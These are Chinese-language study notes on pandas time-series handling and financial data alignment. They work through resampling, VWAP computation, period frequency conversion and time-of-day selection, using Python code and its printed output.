<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> annual_frame.resample(<span class="string">'Q-MAR'</span>, fill_method = <span class="string">'ffill'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        Colorado     Texas  New York      Ohio</span><br><span class="line">2000Q4  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q1  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q2  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q3  0.289860  0.022104 -0.468915  0.008858</span><br><span class="line">2001Q4 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2002Q1 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2002Q2 -0.068266  0.454458 -0.011052  0.074813</span><br><span class="line">2002Q3 -0.068266  0.454458 -0.011052  0.074813</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="时间序列绘图-待补充-lt-span-gt-时间序列绘图"><a href="#时间序列绘图-待补充-lt-span-gt-时间序列绘图" class="headerlink" title="时间序列绘图 待补充&lt;/span&gt; [时间序列绘图]"></a>时间序列绘图 <span class="tag" tag-name="待补充"><span class="smallcaps">待补充</span>&lt;/span&gt; [时间序列绘图]</span></h2><h2 id="移动窗口函数-待补充-lt-span-gt-移动窗口函数"><a href="#移动窗口函数-待补充-lt-span-gt-移动窗口函数" class="headerlink" title="移动窗口函数 待补充&lt;/span&gt; [移动窗口函数]"></a>移动窗口函数 <span class="tag" tag-name="待补充"><span class="smallcaps">待补充</span>&lt;/span&gt; [移动窗口函数]</span></h2><h2 id="性能和内存使用方面的注意事项"><a href="#性能和内存使用方面的注意事项" class="headerlink" title="性能和内存使用方面的注意事项"></a>性能和内存使用方面的注意事项</h2><h3 id="Timestamp和Period都是以64位整数表示的"><a href="#Timestamp和Period都是以64位整数表示的" class="headerlink" title="Timestamp和Period都是以64位整数表示的"></a>Timestamp和Period都是以64位整数表示的</h3><h3 id="性能方面pandas对数据对齐，和重采样运算进行了高度优化"><a href="#性能方面pandas对数据对齐，和重采样运算进行了高度优化" class="headerlink" title="性能方面pandas对数据对齐，和重采样运算进行了高度优化"></a>性能方面pandas对数据对齐，和重采样运算进行了高度优化</h3><h1 id="chapter-11-金融和经济数据应用"><a href="#chapter-11-金融和经济数据应用" class="headerlink" title="chapter 11: 金融和经济数据应用"></a>chapter 11: 金融和经济数据应用</h1><h2 id="本章术语"><a href="#本章术语" class="headerlink" title="本章术语"></a>本章术语</h2><h3 id="截面-cross-section-表示某个时间点的数据"><a href="#截面-cross-section-表示某个时间点的数据" class="headerlink" title="截面(cross-section) 表示某个时间点的数据"></a>截面(cross-section) 表示某个时间点的数据</h3><ol>
<li>例如 标准普尔500指数中所有成分股在特定日期的收盘价就形成了一个截面</li>
</ol>
<h3 id="面板-panel-表示多个时间点的截面数据"><a href="#面板-panel-表示多个时间点的截面数据" class="headerlink" title="面板(panel) 表示多个时间点的截面数据"></a>面板(panel) 表示多个时间点的截面数据</h3><ol>
<li><p>多个数据项(列如价格和成交量)在多个时间点的截面数据就构成了一个面板</p>
</li>
<li><p>面板数据可以被表示为层次化索引的DataFrame， 也可以表示为三维的Panel<br>pandas对象</p>
</li>
</ol>
<h2 id="数据规整化方面的话题"><a href="#数据规整化方面的话题" class="headerlink" title="数据规整化方面的话题"></a>数据规整化方面的话题</h2><h3 id="时间序列以及截面对齐"><a href="#时间序列以及截面对齐" class="headerlink" title="时间序列以及截面对齐"></a>时间序列以及截面对齐</h3><ol>
<li><p>处理金融数据中，最费神的就是所谓的”数据对齐”(data alignment)问题</p>
<ol>
<li><p>主要的问题</p>
<ul>
<li>两个相关的时间序列的索引没有很好的对齐</li>
<li>两个DataFrame对象可能含有不匹配的列或行</li>
</ul>
</li>
<li><p>pandas在算术运算中自动对齐数据</p>
<ol>
<li><p>例子数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">all_prices = pd.read_csv(<span class="string">'./pydata-book-master/ch11/stock_px.csv'</span>,</span><br><span class="line">                         index_col = <span class="number">0</span>, parse_dates = <span class="literal">True</span>)</span><br><span class="line">all_volume = pd.read_csv(<span class="string">'./pydata-book-master/ch11/volume.csv'</span>,</span><br><span class="line">                          index_col = <span class="number">0</span>, parse_dates = <span class="literal">True</span>)</span><br><span class="line">prices = all_prices[[<span class="string">'AAPL'</span>, <span class="string">'JNJ'</span>, <span class="string">'SPX'</span>, <span class="string">'XOM'</span>]]</span><br><span class="line">prices = prices.ix[pd.date_range(<span class="string">'9/6/2011 00:00:00'</span>,<span class="string">'9/14/2011 00:00:00'</span>)].dropna()</span><br><span class="line"><span class="keyword">print</span> prices</span><br><span class="line"></span><br><span class="line">volume = all_volumne[[<span class="string">'AAPL'</span>, <span class="string">'JNJ'</span>, <span class="string">'XOM'</span>]]</span><br><span class="line">volume = volumne.ix[pd.date_range(<span class="string">'9/6/2011'</span>, <span class="string">'9/12/2011'</span>)].dropna()</span><br><span class="line"><span class="keyword">print</span> volume</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">              AAPL    JNJ      SPX    XOM</span><br><span class="line">2011-09-06  379.74  64.64  1165.24  71.15</span><br><span class="line">2011-09-07  383.93  65.43  1198.62  73.65</span><br><span class="line">2011-09-08  384.14  64.95  1185.90  72.82</span><br><span class="line">2011-09-09  377.48  63.64  1154.23  71.01</span><br><span class="line">2011-09-12  379.94  63.59  1162.27  71.84</span><br><span class="line">2011-09-13  384.62  63.61  1172.87  71.65</span><br><span class="line">2011-09-14  389.30  63.73  1188.68  72.64</span><br><span class="line">                  AAPL         JNJ         XOM</span><br><span class="line">2011-09-06  18173500.0  15848300.0  25416300.0</span><br><span class="line">2011-09-07  12492000.0  10759700.0  23108400.0</span><br><span class="line">2011-09-08  14839800.0  15551500.0  22434800.0</span><br><span class="line">2011-09-09  20171900.0  17008200.0  27969100.0</span><br><span class="line">2011-09-12  16697300.0  13448200.0  26205800.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>用有效数据计算一个成交加权平均价格(假设成交量是价格的子集)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> prices * volume</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vwap = (prices * volume).sum() /volume.sum()</span><br><span class="line"><span class="keyword">print</span> vwap</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#因为SPX在volume中没有，所以丢弃</span></span><br><span class="line"><span class="keyword">print</span> vwap.dropna()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">                    AAPL           JNJ  SPX           XOM</span><br><span class="line">2011-09-06  6.901205e+09  1.024434e+09  NaN  1.808370e+09</span><br><span class="line">2011-09-07  4.796054e+09  7.040072e+08  NaN  1.701934e+09</span><br><span class="line">2011-09-08  5.700561e+09  1.010070e+09  NaN  1.633702e+09</span><br><span class="line">2011-09-09  7.614489e+09  1.082402e+09  NaN  1.986086e+09</span><br><span class="line">2011-09-12  6.343972e+09  8.551710e+08  NaN  1.882625e+09</span><br><span class="line">2011-09-13           NaN           NaN  NaN           NaN</span><br><span class="line">2011-09-14           NaN           NaN  NaN           NaN</span><br><span class="line"></span><br><span class="line">AAPL    380.655181</span><br><span class="line">JNJ      64.394769</span><br><span class="line">SPX            NaN</span><br><span class="line">XOM      72.024288</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">AAPL    380.655181</span><br><span class="line">JNJ      64.394769</span><br><span class="line">XOM      72.024288</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要手工对齐，使用DF的align方法，<br>它返回一个元组，含有两个对象的重索引版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> prices.align(volume, join = <span class="string">'inner'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(              AAPL    JNJ    XOM</span><br><span class="line">2011-09-06  379.74  64.64  71.15</span><br><span class="line">2011-09-07  383.93  65.43  73.65</span><br><span class="line">2011-09-08  384.14  64.95  72.82</span><br><span class="line">2011-09-09  377.48  63.64  71.01</span><br><span class="line">2011-09-12  379.94  63.59  71.84,                   AAPL         JNJ         XOM</span><br><span class="line">2011-09-06  18173500.0  15848300.0  25416300.0</span><br><span class="line">2011-09-07  12492000.0  10759700.0  23108400.0</span><br><span class="line">2011-09-08  14839800.0  15551500.0  22434800.0</span><br><span class="line">2011-09-09  20171900.0  17008200.0  27969100.0</span><br><span class="line">2011-09-12  16697300.0  13448200.0  26205800.0)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过一组索引可能不同的Series构建一个DF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s1 = pd.Series(range(<span class="number">3</span>), index = list(<span class="string">'abc'</span>))</span><br><span class="line">s2 = pd.Series(range(<span class="number">4</span>), index = list(<span class="string">'dbce'</span>))</span><br><span class="line">s3 = pd.Series(range(<span class="number">3</span>), index = list(<span class="string">'fac'</span>))</span><br><span class="line"><span class="keyword">print</span> pd.DataFrame(&#123;<span class="string">'one'</span>: s1,</span><br><span class="line">                    <span class="string">'two'</span>: s2,</span><br><span class="line">                    <span class="string">'three'</span>: s3&#125;)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示定义结果索引(丢弃其余的数据)</span></span><br><span class="line"><span class="keyword">print</span>  pd.DataFrame(&#123;<span class="string">'one'</span>: s1,</span><br><span class="line">                     <span class="string">'two'</span>: s2,</span><br><span class="line">                     <span class="string">'three'</span>: s3&#125;,</span><br><span class="line">                    index = list(<span class="string">'face'</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   one  three  two</span><br><span class="line">a  0.0    1.0  NaN</span><br><span class="line">b  1.0    NaN  1.0</span><br><span class="line">c  2.0    2.0  2.0</span><br><span class="line">d  NaN    NaN  0.0</span><br><span class="line">e  NaN    NaN  3.0</span><br><span class="line">f  NaN    0.0  NaN</span><br><span class="line"></span><br><span class="line">   one  three  two</span><br><span class="line">f  NaN    0.0  NaN</span><br><span class="line">a  0.0    1.0  NaN</span><br><span class="line">c  2.0    2.0  2.0</span><br><span class="line">e  NaN    NaN  3.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>频率不同的时间序列的运算</p>
<ol>
<li><p>因为盈利预测调整随时可能发生等原因，频率转换和冲对齐的两个主要方法是resample和reindex</p>
<ol>
<li><p>resample用于将数据转换到固定频率，reindex用于使数据符合一个新索引</p>
</li>
<li><p>这两方法都支持插值逻辑</p>
</li>
<li><p>周型时间序列</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ts1 = pd.Series(np.random.randn(<span class="number">3</span>),</span><br><span class="line">                index = pd.date_range(<span class="string">'2012-6-13'</span>, periods = <span class="number">3</span>, freq = <span class="string">'W-WED'</span>))</span><br><span class="line"><span class="keyword">print</span> ts1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将其重采样到工作日频率，没有的数据会是NAN</span></span><br><span class="line"><span class="keyword">print</span> ts1.resample(<span class="string">'B'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#填充空白，处理较低频率数据常常这么干</span></span><br><span class="line"><span class="keyword">print</span> ts1.resample(<span class="string">'B'</span>, fill_method = <span class="string">'ffill'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在实际工作中，将较低频率的数据升采样到较高的规整频率是一个不错的解决方案</span></span><br><span class="line"><span class="comment">#但是对于更一般化的不规整时间序列不太适合</span></span><br><span class="line">dates = pd.DatetimeIndex([<span class="string">'2012-6-12'</span>, <span class="string">'2012-6-17'</span>, <span class="string">'2012-6-18'</span>,</span><br><span class="line">                          <span class="string">'2012-6-21'</span>, <span class="string">'2012-6-22'</span>, <span class="string">'2012-6-29'</span>])</span><br><span class="line">ts2 = pd.Series(np.random.randn(<span class="number">6</span>), index = dates)</span><br><span class="line"><span class="keyword">print</span> ts2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在维持ts2的日期索引，处理ts1和ts2之间的运算，用reindex是更好的解决方法</span></span><br><span class="line"><span class="keyword">print</span> ts1.reindex(ts2.index, method = <span class="string">'ffill'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts2 + ts1.reindex(ts2.index, method = <span class="string">'ffill'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">2012-06-13    1.644655</span><br><span class="line">2012-06-20   -1.245813</span><br><span class="line">2012-06-27    1.016858</span><br><span class="line">Freq: W-WED, dtype: float64</span><br><span class="line"></span><br><span class="line">DatetimeIndexResampler [freq=&lt;BusinessDay&gt;, axis=0, closed=left, label=left, convention=start, base=0]</span><br><span class="line"></span><br><span class="line">2012-06-13    1.644655</span><br><span class="line">2012-06-14    1.644655</span><br><span class="line">2012-06-15    1.644655</span><br><span class="line">2012-06-18    1.644655</span><br><span class="line">2012-06-19    1.644655</span><br><span class="line">2012-06-20   -1.245813</span><br><span class="line">2012-06-21   -1.245813</span><br><span class="line">2012-06-22   -1.245813</span><br><span class="line">2012-06-25   -1.245813</span><br><span class="line">2012-06-26   -1.245813</span><br><span class="line">2012-06-27    1.016858</span><br><span class="line">Freq: B, dtype: float64</span><br><span class="line"></span><br><span class="line">2012-06-12   -0.068556</span><br><span class="line">2012-06-17   -0.537801</span><br><span class="line">2012-06-18    0.171733</span><br><span class="line">2012-06-21   -0.187693</span><br><span class="line">2012-06-22   -1.213072</span><br><span class="line">2012-06-29   -0.092329</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2012-06-12         NaN</span><br><span class="line">2012-06-17    1.644655</span><br><span class="line">2012-06-18    1.644655</span><br><span class="line">2012-06-21   -1.245813</span><br><span class="line">2012-06-22   -1.245813</span><br><span class="line">2012-06-29    1.016858</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2012-06-12         NaN</span><br><span class="line">2012-06-17    1.106854</span><br><span class="line">2012-06-18    1.816387</span><br><span class="line">2012-06-21   -1.433506</span><br><span class="line">2012-06-22   -2.458885</span><br><span class="line">2012-06-29    0.924529</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>使用period</p>
<ol>
<li><p>period提供了另一种处理不同频率时间序列的方法，尤其对特殊规范的以年或季度为频率的金融或经济序列</p>
<ol>
<li><p>比如一个公司可能会发布6月结尾的财年的每季度盈利报告，其频率为Q-JUN</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdp = pd.Series([<span class="number">1.78</span>, <span class="number">1.94</span>, <span class="number">2.08</span>, <span class="number">2.01</span>, <span class="number">2.15</span>, <span class="number">2.31</span>, <span class="number">2.46</span>],</span><br><span class="line">                index = pd.period_range(<span class="string">'1984Q2'</span>, periods = <span class="number">7</span>, freq = <span class="string">'Q-SEP'</span>))</span><br><span class="line">infl = pd.Series([<span class="number">0.025</span>, <span class="number">0.045</span>, <span class="number">0.037</span>, <span class="number">0.04</span>],</span><br><span class="line">                 index = pd.period_range(<span class="string">'1982'</span>, periods = <span class="number">4</span>, freq = <span class="string">'A-DEC'</span>))</span><br><span class="line"><span class="keyword">print</span> gdp</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> infl</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1984Q2    1.78</span><br><span class="line">1984Q3    1.94</span><br><span class="line">1984Q4    2.08</span><br><span class="line">1985Q1    2.01</span><br><span class="line">1985Q2    2.15</span><br><span class="line">1985Q3    2.31</span><br><span class="line">1985Q4    2.46</span><br><span class="line">Freq: Q-SEP, dtype: float64</span><br><span class="line"></span><br><span class="line">1982    0.025</span><br><span class="line">1983    0.045</span><br><span class="line">1984    0.037</span><br><span class="line">1985    0.040</span><br><span class="line">Freq: A-DEC, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>跟Timestamp的时间序列不同，Period索引的两个不同频率之间的运算必须进行显示换算</p>
<ol>
<li><p>已知infl值是每年年末观察的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">infl_q = infl.asfreq(<span class="string">'Q-SEP'</span>, how = <span class="string">'end'</span>)</span><br><span class="line"><span class="keyword">print</span> infl_q</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后这个时间序列重索引</span></span><br><span class="line"><span class="keyword">print</span> infl_q.reindex(gdp.index, method = <span class="string">'ffill'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1983Q1    0.025</span><br><span class="line">1984Q1    0.045</span><br><span class="line">1985Q1    0.037</span><br><span class="line">1986Q1    0.040</span><br><span class="line">Freq: Q-SEP, dtype: float64</span><br><span class="line">1984Q2    0.045</span><br><span class="line">1984Q3    0.045</span><br><span class="line">1984Q4    0.045</span><br><span class="line">1985Q1    0.037</span><br><span class="line">1985Q2    0.037</span><br><span class="line">1985Q3    0.037</span><br><span class="line">1985Q4    0.037</span><br><span class="line">Freq: Q-SEP, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p>时间和”最当前”数据选取</p>
<ol>
<li><p>假设有一个很长的盘中市场数据时间序列，希望抽取其中每天特定时间的价格数据</p>
</li>
<li><p>但是如果数据不规则(观察值没有精确的落在期望的时间点上)</p>
</li>
<li><p>如果不够小心，很容易导致错误的数据规整化</p>
<ol>
<li><p>例子数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成一个交易日内的日期范围和时间序列</span></span><br><span class="line">rng = pd.date_range(<span class="string">"2012-06-01 09:30"</span>, <span class="string">'2012-06-01 15:59'</span>, freq = <span class="string">'T'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成5天的时间点(9:30到15:59之间的值)</span></span><br><span class="line">rng = rng.append([rng + pd.offsets.BDay(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">4</span>)])</span><br><span class="line">ts = pd.Series(np.arange(len(rng), dtype = float), index = rng)</span><br><span class="line"><span class="keyword">print</span> ts[:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">print</span> ts[<span class="number">-5</span>:]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2012-06-01 09:30:00    0.0</span><br><span class="line">2012-06-01 09:31:00    1.0</span><br><span class="line">2012-06-01 09:32:00    2.0</span><br><span class="line">2012-06-01 09:33:00    3.0</span><br><span class="line">2012-06-01 09:34:00    4.0</span><br><span class="line">dtype: float64</span><br><span class="line">2012-06-06 15:55:00    1555.0</span><br><span class="line">2012-06-06 15:56:00    1556.0</span><br><span class="line">2012-06-06 15:57:00    1557.0</span><br><span class="line">2012-06-06 15:58:00    1558.0</span><br><span class="line">2012-06-06 15:59:00    1559.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用python的datetime.time对象进行索引即可抽取这样的时间点上的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">print</span> ts[time(<span class="number">10</span>,<span class="number">0</span>)]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实际上，该操作使用了实例方法at_time</span></span><br><span class="line"><span class="keyword">print</span> ts.at_time(time(<span class="number">10</span>,<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2012-06-01 10:00:00      30.0</span><br><span class="line">2012-06-04 10:00:00     420.0</span><br><span class="line">2012-06-05 10:00:00     810.0</span><br><span class="line">2012-06-06 10:00:00    1200.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2012-06-01 10:00:00      30.0</span><br><span class="line">2012-06-04 10:00:00     420.0</span><br><span class="line">2012-06-05 10:00:00     810.0</span><br><span class="line">2012-06-06 10:00:00    1200.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>between~time方法~，用于选取两个time对象之间的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts.between_time(time(<span class="number">10</span>,<span class="number">0</span>), time(<span class="number">10</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2012-06-01 10:00:00      30.0</span><br><span class="line">2012-06-01 10:01:00      31.0</span><br><span class="line">2012-06-04 10:00:00     420.0</span><br><span class="line">2012-06-04 10:01:00     421.0</span><br><span class="line">2012-06-05 10:00:00     810.0</span><br><span class="line">2012-06-05 10:01:00     811.0</span><br><span class="line">2012-06-06 10:00:00    1200.0</span><br><span class="line">2012-06-06 10:01:00    1201.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于刚好没有所对应的值(上午10点)，需要得到之前(上午10点之前)最后出现的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">indexer = np. sort(np.random.permutation(len(ts))[<span class="number">700</span>:])</span><br><span class="line">irr_ts = ts.copy()</span><br><span class="line">irr_ts[indexer] = np.nan</span><br><span class="line"><span class="keyword">print</span> irr_ts[<span class="string">'2012-06-01 09:50'</span>: <span class="string">'2012-06-01 10:00'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将一组TImestamp传入asof方法，能得到最近的有效值</span></span><br><span class="line">selection = pd.date_range(<span class="string">'2012-06-01 10:00'</span>, periods = <span class="number">4</span>, freq = <span class="string">'B'</span>)</span><br><span class="line"><span class="keyword">print</span> irr_ts.asof(selection)</span><br></pre></td></tr></table></figure>
